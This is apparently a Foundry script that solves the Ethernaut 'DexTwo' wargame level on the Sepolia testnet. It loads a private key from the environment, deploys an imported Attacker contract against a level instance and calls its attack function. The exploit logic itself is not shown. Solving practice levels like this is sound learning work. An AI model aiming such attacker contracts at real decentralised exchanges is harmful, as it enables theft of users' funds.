// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.19;

import "forge-std/Script.sol";
import "src/23_DexTwo/Level.sol";
import "src/23_DexTwo/Attacker.sol";

contract DexTwoScript is Script {
    //COMMANDS:
    //source .env
    //forge script script/23_DexTwo.s.sol:DexTwoScript --rpc-url $SEPOLIA_RPC_URL --broadcast -vvvv
    function run() external {
        //This script works because you don't need any initial tokens
        uint256 deployerPrivateKey = vm.envUint("SEPOLIA_PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        DexTwo target = DexTwo(0xEe0C2a134C0b35cc917c47DE01FDb90a18dB41fa); // Change with your instance
        Attacker attacker = new Attacker(address(target));
        attacker.attack();
    }
}
